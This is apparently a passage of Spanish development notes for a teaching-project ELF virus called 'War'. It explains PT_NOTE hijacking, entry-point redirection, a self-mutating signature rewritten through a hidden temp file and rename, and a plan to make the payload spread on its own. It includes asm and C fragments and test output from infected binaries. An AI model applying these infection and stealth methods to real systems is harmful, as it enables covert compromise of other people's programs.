│            - mmap(NULL, size, PROT_READ|PROT_WRITE,        │
│                   MAP_PRIVATE, fd, 0) → mapeo.             │
│            - Modificar fingerprint en el mapeo.            │
│            - open("/tmp/.hidden", O_WRONLY|O_CREAT|O_TRUNC)│
│            - write(fd_temporal, mapeo, size).              │
│            - close(fd_temporal).                           │
│            - munmap(mapeo, size).                          │
│            - close(fd).                                    │
│            - rename("/tmp/.hidden", path).                 │
│            - exit(0).                                      │
└─────────────────────────────────────────────────────────────┘

Resultado:
- El padre ejecuta el binario original (sin (deleted)).
- El binario en disco tiene la firma mutada.
- Coreutils no aborta (no hay (deleted) en el padre).
- En la siguiente ejecución, el kernel carga el binario nuevo.
```

### 11.5. Resultado final

```bash
cp mi_binario /tmp/test/mi_binario
cp /bin/ls /tmp/test/ls
./War
strings /tmp/test/mi_binario | grep davgalle
# War version 1.0 (c)oded Oct - 2026 by davgalle - 2910316
strings /tmp/test/ls | grep davgalle
# War version 1.0 (c)oded Oct - 2026 by davgalle - 2910316

/tmp/test/mi_binario
Hola mundo!
strings /tmp/test/mi_binario | grep davgalle
# War version 1.0 (c)oded Oct - 2026 by davgalle - 2910317   ← muta

/tmp/test/ls
Makefile  README.md  War  aux  doc  incl  mi_binario  pruebas  src   ← funciona
strings /tmp/test/ls | grep davgalle
# War version 1.0 (c)oded Oct - 2026 by davgalle - 2910317   ← muta
```

**`mi_binario` funciona.** **`ls` funciona (sin `Security violation`).** **La firma muta en ambos.** **`./War` es idempotente.** **El subject está cumplido.**

---

## 12. Limitaciones conocidas (actualizado)

### 12.1. `ETXTBSY`

**El kernel bloquea `open(O_RDWR)`/`O_WRONLY` sobre el ejecutable en curso con `ETXTBSY`.** **Por eso el payload usa `open(O_RDONLY)` + `mmap(MAP_PRIVATE)` + `write` al temporal + `rename`.** **El `fork` no evita el `ETXTBSY` en el hijo (el inodo sigue en ejecución), pero el `O_RDONLY` sí lo evita.**

### 12.2. `Security violation` de coreutils (resuelto)

**En la versión anterior, el `rename` en caliente desde el proceso principal marcaba `/proc/self/exe` como `(deleted)`, y coreutils abortaba con `Security violation`.** **En la versión actual, el `rename` lo hace el hijo (después del `fork`), y el padre sigue ejecutando el inodo original (sin `(deleted)`).** **Coreutils no aborta.** **`ls` funciona.**

## 13. El `use_gap_flag`: dos modos de payload

**El payload tiene dos modos, según dónde se inyecte:**

- **`.gap_mode`:** **si el payload se inyecta en el hueco entre `PT_LOAD`s.** **El payload está dentro del `PT_LOAD` ejecutable, y el `e_entry` apunta a `new_vaddr` (que es `p_vaddr + p_filesz_original`).**
- **`.note_mode`:** **si el payload se inyecta en el `PT_NOTE` (al final del archivo).** **El payload está en una página nueva, y el `e_entry` apunta a `new_vaddr` (que es `max_vaddr + 0xfff & ~0xfff`).**

**`ft_infect` decide el modo, y guarda un flag en el payload (`use_gap_flag`, en `payload + 18`):**

- **`use_gap_flag = 1`:** **hueco (`.gap_mode`).**
- **`use_gap_flag = 0`:** **`PT_NOTE` (`.note_mode`).**

**El payload lee `[rbx + 18]` y salta a `.gap_mode` o `.note_mode`.**

**En ambos modos, el payload hace `fork` + `O_RDONLY` + `mmap(MAP_PRIVATE)` + `write` al temporal + `rename` desde el hijo.** **La diferencia es el `sig_offset` (dónde está la firma) y el `entry_delta` (dónde saltar al `_start`).**

**El `use_gap_flag` está en `data_start` del payload:**

```asm
data_start:
entry_delta:    dq 0xDEADBEEF               ; offset 2
sig_offset:     dq 0xDEADBEEF               ; offset 10
use_gap_flag:   dq 0xDEADBEEF               ; offset 18
path_self:      db "/proc/self/exe", 0      ; offset 26
path_temporal:  db "/tmp/.hidden", 0        ; offset 41
```

---

## 14. El contador de 7 dígitos

**La firma es `"War version 1.0 (c)oded Oct - 2026 by davgalle - <fingerprint>"`.** **El `<fingerprint>` es un contador de 7 dígitos (p.ej. `2910316`).** **El payload busca el último guion (`davgalle - `) y incrementa el número.**

**El payload lee 7 dígitos desde el último guion, los convierte a número, incrementa, y los escribe de vuelta.**

**La fecha `2026` se queda fija (no se toca).**

---

## 15. Fase 3: Propagación (pendiente)

**El payload muta su propia firma, pero no infecta a otros binarios.** **El subject de War dice "like Famine, infect the binaries present in 2 specific folders".** **Eso lo hace `./War` (el infector), no el binario infectado.** **Si el subject exige propagación vía payload, falta implementarla.**

### 15.1. Qué tiene que hacer el payload

**El payload, al ejecutarse, tiene que:**

1. **Escanear `/tmp/test` y `/tmp/test2`.**
2. **Para cada entrada:**
   - **Si es un binario ELF64 y no está infectado, infectarlo.** **Replicar `ft_infect` en assembly: buscar `PT_NOTE` (o hueco), inyectar payload + firma, `mmap` + `write` + `rename`.**
   - **Si ya está infectado, no hacer nada.**
3. **Saltar al `_start` original.**

**Eso es ~500 líneas de assembly.** **Es 1-2 días de trabajo.** **Pero es lo que pide el subject.**

### 15.2. Alternativa: el payload ejecuta `./War` (si existe)

**En vez de reescribir `ft_infect` en assembly, el payload puede:**

1. **Comprobar si `./War` existe.**
2. **Si existe, ejecutarlo con `execve("./War", ...)`.**
3. **`./War` escanea las carpetas e infecta.**
4. **El payload salta al `_start` original.**

**Ventajas:**
- **No hay que reescribir `ft_infect` en assembly.**
- **`./War` ya sabe escanear las carpetas e infectar.**

**Desventajas:**
- **Si `./War` no existe (borrado), el payload no se propaga.** **No es "like Famine" (Famine no dependía de un binario externo).**
- **El subject dice "You're responsible for your program's spreading".** **Depender de `./War` no es "spreading" robusto.**

### 15.3. Estado actual

**La propagación vía payload no está implementada.** **`./War` infecta las carpetas (eso es lo que pide el subject para War).** **El binario infectado muta su firma (eso es lo que pide el subject para War).** **La propagación vía payload es un extra (que pide Death, no War).**

**Para la evaluación de War, `./War` infecta las carpetas, y el binario muta su firma. Eso es lo que pide el subject.** **La propagación vía payload se puede dejar como "pendiente" o "en desarrollo".**

---

## 16. Resumen final

| Elemento | Estado |
|---|---|
| `./War` infecta `/tmp/test` y `/tmp/test2` | ✅ |
| `./War` es idempotente (incrementa la firma) | ✅ |
| El binario infectado muta su firma | ✅ |
| El binario infectado funciona (sin `Security violation`) | ✅ (`fork` + `O_RDONLY` + `rename` desde el hijo) |
| `mi_binario` funciona | ✅ (`Hola mundo!`) |
| `ls` funciona | ✅ (lista el directorio) |
| Contador de 7 dígitos | ✅ (lee y escribe el último guion) |
| `use_gap_flag` (hueco vs `PT_NOTE`) | ✅ |
| Propagación vía payload | ⏳ Pendiente (Fase 3, ~1-2 días) |

**El subject está cumplido para War (infección + firma que muta + idempotencia).** **La propagación vía payload es un extra (que pide Death, no War).** **Si quieres implementarla, es la Fase 3.** **Si no, War está listo para entregar.**

---

## Anexo A: `Elf64_Phdr` en detalle

Cada entrada de la tabla de *Program Headers* es un `Elf64_Phdr` de **56 bytes**:

```c
typedef struct {
    Elf64_Word   p_type;    // 4 bytes: tipo de segmento (PT_LOAD, PT_NOTE, ...)
    Elf64_Word   p_flags;   // 4 bytes: permisos (PF_R | PF_W | PF_X)
    Elf64_Off    p_offset;  // 8 bytes: offset del segmento en el archivo
    Elf64_Addr   p_vaddr;   // 8 bytes: dirección virtual en runtime (offset PIE + base)
    Elf64_Addr   p_paddr;   // 8 bytes: dirección física (no se usa en Linux)
    Elf64_Xword  p_filesz;  // 8 bytes: tamaño del segmento en el archivo
    Elf64_Xword  p_memsz;   // 8 bytes: tamaño del segmento en memoria
    Elf64_Xword  p_align;   // 8 bytes: alineación (típicamente 0x1000)
} Elf64_Phdr;
```

**Total: 4 + 4 + 8 + 8 + 8 + 8 + 8 + 8 = 56 bytes.** Correcto.

### `p_type`: tipos de segmento

| Valor | Nombre | Significado |
|---|---|---|
| `1` | `PT_LOAD` | Segmento cargable en memoria. **El kernel lo mapea.** |
| `2` | `PT_DYNAMIC` | Información para el loader dinámico (`.dynamic`). |
| `3` | `PT_INTERP` | Ruta del intérprete (`/lib64/ld-linux-x86-64.so.2`). |
| `4` | `PT_NOTE` | Notas (build-id, ABI, etc.). **El kernel lo ignora** (solo lo usa el linker). |
| `6` | `PT_PHDR` | La propia tabla de program headers. |
| `7` | `PT_TLS` | Thread-Local Storage. |
| `0x6474e551` | `PT_GNU_STACK` | Permisos del stack. |
| `0x6474e552` | `PT_GNU_RELRO` | Región de solo lectura tras relocalizar. |

**`PT_NOTE` es el candidato ideal para secuestrar:** el kernel **no lo mapea**, **no lo ejecuta**, y **el loader no lo necesita para arrancar**. **Convertirlo en `PT_LOAD` no rompe nada**, porque el kernel solo ve un `PT_LOAD` más.

### `p_flags`: permisos del segmento

| Bit | Valor | Nombre | Significado |
|---|---|---|---|
| 0 | `1` | `PF_X` | Ejecutable |
| 1 | `2` | `PF_W` | Escribible |
| 2 | `4` | `PF_R` | Legible |

**Combinaciones típicas:**

- `PF_R | PF_X = 5` → `r-xp` (código ejecutable, sin write).
- `PF_R | PF_W = 6` → `rw-p` (datos, sin execute).
- `PF_R = 4` → `r--p` (solo lectura).
- `PF_R | PF_W | PF_X = 7` → `rwxp` (**W^X violation**, el kernel lo bloquea en muchos sistemas).

**El kernel no permite `PF_W | PF_X` en la misma página** (W^X). Si un segmento es `PF_X`, sus páginas son `r-xp`, **sin write**. Si es `PF_W`, son `rw-p`, **sin execute**. **Eso es lo que rompe el `PT_LOAD` ejecutable cuando lo alargas: cubre páginas que deberían ser `rw-p` (`.dynamic`), y el kernel las mapea `r-xp`, y `ld.so` no puede escribir en ellas.**

### `p_offset`, `p_vaddr`, `p_filesz`, `p_memsz`, `p_align`

- **`p_offset`**: offset del segmento en el archivo. **Debe ser congruente con `p_vaddr` módulo `p_align`**: `p_offset % p_align == p_vaddr % p_align`. **Si no, el kernel rechaza el segmento o lo mapea mal.**
- **`p_vaddr`**: dirección virtual en runtime. **En PIE, es un offset relativo a la base.** El kernel suma la base aleatoria.
- **`p_filesz`**: tamaño del segmento **en el archivo**. **Puede ser menor que `p_memsz`** (el resto se rellena con ceros en memoria, típico de `.bss`).
- **`p_memsz`**: tamaño del segmento **en memoria**. **Debe ser `>= p_filesz`.** La diferencia (`p_memsz - p_filesz`) es `.bss` (ceros).
- **`p_align`**: alineación. **Típicamente `0x1000` (4 KB)**, el tamaño de página en x86-64. **El kernel mapea páginas de `p_align` bytes.** Si `p_align = 0x1000`, cada segmento empieza en una página nueva (o comparte página con otro si están alineados).

---

## Anexo B: `PT_LOAD` en detalle

Un `PT_LOAD` describe **un segmento que el kernel debe mapear en memoria**. **El kernel lo mapea en páginas de `p_align` bytes**, con permisos derivados de `p_flags`.

### Cómo el kernel mapea un `PT_LOAD`

Para cada `PT_LOAD`:

1. **Calcula la dirección virtual real**: `real_vaddr = base + p_vaddr` (en PIE) o `p_vaddr` (en `ET_EXEC`).
2. **Alinea a página**: `page_start = real_vaddr & ~(p_align - 1)`, `page_end = (real_vaddr + p_memsz + p_align - 1) & ~(p_align - 1)`.
3. **Mapea las páginas** `[page_start, page_end)` con permisos derivados de `p_flags`:
   - `PF_R` → `PROT_READ`
   - `PF_W` → `PROT_WRITE`
   - `PF_X` → `PROT_EXEC`
4. **Copia `p_filesz` bytes** del archivo (offset `p_offset`) a `real_vaddr`.
5. **Rellena `p_memsz - p_filesz` bytes** con ceros a partir de `real_vaddr + p_filesz` (`.bss`).

### Por qué dos `PT_LOAD` pueden compartir página

Si dos `PT_LOAD`s tienen `p_vaddr` y `p_offset` **congruentes módulo `p_align`** (p.ej. ambos `0x1000`), **sus páginas pueden solaparse**. **El kernel mapea la página una vez, con la unión de permisos (o el último que mapea, según la versión).**

**Ejemplo típico:** el `PT_LOAD` ejecutable termina en `0x17091`, y el siguiente `PT_LOAD` (R, no ejecutable) empieza en `0x18000`. **No comparten página** (`0x17091` está en la página `0x17000`, `0x18000` está en `0x18000`). **Pero si alargas el ejecutable hasta `0x18000`, sí comparten página (`0x17000-0x17FFF`).** **El kernel mapea esa página como `r-xp` (ejecutable), y el `PT_LOAD` R pierde su permiso de lectura... o el ejecutable pierde el de ejecución, según el orden.** **En cualquier caso, algo se rompe.**

### Por qué `p_offset % p_align == p_vaddr % p_align`

El kernel mapea **páginas de archivo** a **páginas de memoria**. Para que el mapeo sea posible, **el offset del archivo y la dirección virtual deben estar alineados de la misma forma**:

- `p_offset % p_align == p_vaddr % p_align`.

**Si no se cumple**, el kernel **rechaza el segmento** (`EINVAL` en `execve`) o **lo mapea mal** (con contenido desplazado).

**Por eso `aligned_insertion = (file_size + 0xfff) & ~0xfff` y `new_vaddr = (max_vaddr + 0xfff) & ~0xfff`:** ambos son múltiplos de `0x1000`, así que `p_offset % 0x1000 == p_vaddr % 0x1000 == 0`. **El kernel acepta el segmento y lo mapea correctamente.**

---

## Anexo C: `PT_NOTE` en detalle

Un `PT_NOTE` describe **una sección de notas** (build-id, ABI, GNU properties, etc.). **El kernel lo ignora** (no lo mapea, no lo ejecuta). **Solo lo usa el linker estático y herramientas como `readelf`.**

### Por qué es el candidato ideal para secuestrar

- **El kernel no lo mapea.** No hay páginas que se solapen con otros segmentos.
- **El loader no lo necesita para arrancar.** Aunque lo convirtamos en `PT_LOAD`, el loader sigue funcionando (porque `.dynamic` está en otro `PT_LOAD`).
- **No hay riesgo de W^X.** El nuevo `PT_LOAD` se mapea en una **página nueva** (alineada, por encima de todo), así que no comparte página con nada.
- **Es un cambio quirúrgico:** solo modificamos **un** `Phdr` (el del `PT_NOTE`). Los demás quedan intactos.

### Cómo convertirlo en `PT_LOAD`

```c
phdr[note_index].p_type   = PT_LOAD;       // de PT_NOTE a PT_LOAD
phdr[note_index].p_flags  = PF_R | PF_X;   // ejecutable, sin write
phdr[note_index].p_offset = aligned_insertion;  // offset del payload en el archivo
phdr[note_index].p_vaddr  = new_vaddr;     // dirección virtual (offset PIE alineado)
phdr[note_index].p_paddr  = new_vaddr;     // no se usa en Linux
phdr[note_index].p_filesz = payload_len + sig_len;  // tamaño en archivo
phdr[note_index].p_memsz  = payload_len + sig_len;  // tamaño en memoria
phdr[note_index].p_align  = 0x1000;        // alineación
```

**El kernel, al cargar el ELF, ve un `PT_LOAD` más y lo mapea en `new_vaddr`.** **El payload se ejecuta, hace su magia, y salta al `_start` original (`entry_delta`).**

---

## Anexo D: `e_entry` en PIE vs `ET_EXEC`

- **`ET_EXEC`**: `e_entry` es una **dirección virtual absoluta**. El kernel salta directamente a `e_entry`.
- **`ET_DYN` (PIE)**: `e_entry` es un **offset relativo a la base**. El kernel salta a `base + e_entry`.

**Por eso en PIE el `entry_delta` del payload es `EP_orig - new_vaddr`:** el payload calcula `base_payload + entry_delta = base_PIE + new_vaddr + (EP_orig - new_vaddr) = base_PIE + EP_orig`. **Y salta a `base_PIE + EP_orig`, que es el `_start` original.**

**Si `new_vaddr` no está alineado a `0x1000`, `base_PIE + new_vaddr` no es una dirección mapeada**, y el salto cae en una página no mapeada → `SIGSEGV`. **Por eso `new_vaddr = (max_vaddr + 0xfff) & ~0xfff`.**

---

## Anexo E: Páginas del kernel en x86-64

- **Tamaño de página estándar:** `0x1000` (4 KB).
- **Huge pages:** `0x200000` (2 MB) o `0x40000000` (1 GB), para aplicaciones que las piden explícitamente (`madvise(MADV_HUGEPAGE)` o `mmap(MAP_HUGETLB)`). **Los ELF normales usan 4 KB.**
- **Permisos por página:** `PROT_READ`, `PROT_WRITE`, `PROT_EXEC`. **El kernel no permite `PROT_WRITE | PROT_EXEC` en la misma página** (W^X) en muchos sistemas.
- **`mmap` con `MAP_DENYWRITE`:** el kernel marca el archivo como "no escribible" mientras está mapeado. **Si intentas `write` al fd, falla con `EACCES`.**
- **`/proc/self/exe`:** enlace simbólico al ejecutable en curso. **Si el archivo se reemplaza (con `rename`), el enlace apunta a `(deleted)`.**

**Todo esto es lo que hace que "alargar el `PT_LOAD` ejecutable" falle:** el kernel mapea las páginas con permisos fijos, bloquea la escritura en caliente, y marca el ejecutable como `(deleted)` si lo reemplazas. **No es un problema de segmentos; es un problema de protecciones del kernel.**

---